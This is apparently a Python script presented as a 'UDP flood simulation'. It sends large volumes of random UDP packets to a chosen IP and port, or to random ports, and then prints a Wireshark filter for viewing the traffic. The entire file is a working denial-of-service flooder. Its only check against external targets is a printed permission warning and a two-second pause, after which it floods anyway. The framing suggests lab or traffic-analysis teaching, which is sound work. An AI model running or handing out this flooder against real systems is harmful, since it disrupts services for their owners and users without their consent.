import socket
import sys
import argparse
import random
import time

def udp_flood(target_ip, target_port, num_packets, size):
    # Port 0 means hit a random port every time
    print(f"[*] Starting UDP Flood Simulation against {target_ip}:{target_port if target_port else 'RANDOM'}")
    print(f"[*] Sending {num_packets} packets (Payload size: {size} bytes)...")
    
    # Generate some random bytes for the UDP payload
    payload = random.randbytes(size)
    sent = 0
    total_mb = 0
    
    try:
        # We only need one socket for UDP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(num_packets):
            # If target_port is 0, choose a random port
            dport = target_port if target_port else random.randint(1, 65535)
            s.sendto(payload, (target_ip, dport))
            sent += 1
            total_mb += size / 1024 / 1024
            
            if sent % 5000 == 0:
                print(f"  [+] Sent {sent}/{num_packets} UDP packets ({total_mb:.2f} MB total)...")
                
    except KeyboardInterrupt:
        print("\n[*] Simulation stopped by user.")
    finally:
        s.close()
    
    print(f"\n[✓] Simulation complete. Total packets sent: {sent} ({total_mb:.2f} MB)")
    print("\n--- Wireshark Analysis Guide ---")
    print(f"Filter : udp && ip.dst == {target_ip}")
    print("Look for: High volume of UDP packets to the target IP.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="UDP Flood Simulation (Basic Socket Method)")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=80, help="Target port (0 for random ports, default: 80)")
    parser.add_argument("--count", type=int, default=100000, help="Number of packets to send (default: 100000)")
    parser.add_argument("--size", type=int, default=1024, help="Payload size in bytes (default: 1024)")
    
    args = parser.parse_args()
    
    if args.target != "127.0.0.1":
        print(f"[!] WARNING: You are targeting an external IP ({args.target}). Ensure you have permission.")
        time.sleep(2)
        
    udp_flood(args.target, args.port, args.count, args.size)
